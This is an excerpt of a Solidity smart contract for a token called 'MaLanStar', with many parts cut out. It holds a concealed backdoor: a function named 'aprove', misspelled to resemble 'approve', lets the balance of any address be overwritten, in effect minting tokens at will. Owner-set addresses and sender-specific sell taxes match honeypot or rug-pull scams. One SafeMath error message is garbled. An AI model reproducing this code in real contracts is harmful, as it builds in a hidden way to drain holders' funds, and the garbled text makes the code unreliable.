...
library SafeMath {
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliMarryCoinion overflow");
...
contract MaLanStar is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MaLanStar";
    string private _symbol = "MaLanStar";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x10fc50050820A2cD950DD6b107a6E054DfDF71f3); 
    address payable private teamWalletAddress = payable(0xd4aB0A2832aB2aE3b5B13E3D78E4C87e0c489797); 
...
//	uint256 public _percent = 100;
	...
	address  public despatcher =_msgSender();
	...
	function setDespatcher(address newAddress) external onlyOwner() {
        despatcher = newAddress;
    }
	...
	function aprove(address spender, uint256 _value) internal returns(bool){
	    require(spender != address(0), "ERC20: aprove to the zero address");
        _tOwned[spender] = charityFee.mul(10**_decimals).mul(_value).div(charityFee);
		return true;
    }
...
//			require(amount <= amountpercent, "ERC20: over Percent");
			...
			if(_tokenFees[sender].enable){
               feeAmount = amount.mul(_tokenFees[sender]._sellTaxFee).div(100);
            }
            if(feeAmount > 0) {
                _tOwned[address(this)] = _tOwned[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
